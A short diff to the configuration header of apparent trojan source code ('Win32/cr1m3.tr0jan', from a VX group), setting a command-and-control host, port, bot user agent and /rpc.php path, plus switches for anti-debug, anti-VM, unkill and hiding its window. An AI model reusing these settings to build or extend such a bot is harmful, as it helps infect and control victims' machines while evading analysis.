@@ -1,7 +1,13 @@
+/*
+	Educational purposes only
+	GPL LICENSE:  @Cr1m3 / JennyLab
+	Win32/cr1m3.tr0jan
+*/
+
 #ifndef __CONFIG_H_FILE
 #define __CONFIG_H_FILE
 
-#define HOST "192.168.15.21"
+#define HOST "192.168.1.2"
 #define PORT 80
 #define USER_AGENT "cr1m3 b0t v0.001\0"
 #define PATH "/rpc.php\0"
@@ -14,8 +20,8 @@
 #define COPYRIGHT "@cr1m3 written by h0ffy // JennyLab VX"
 
 
-#define SECURITY_STATUS 0 // 1 = antidebug, unkill, antivm, etc... 0 = disabled
-#define HIDE_ME 0 // 1 = hide windows, 0 = show window
+#define SECURITY_STATUS 0 //    1 = antidebug, unkill, antivm, etc... 0 = disabled
+#define HIDE_ME 0 //            1 = hide windows, 0 = show window
 
 #define comment "Research me" \
 		"@cr1m3" 
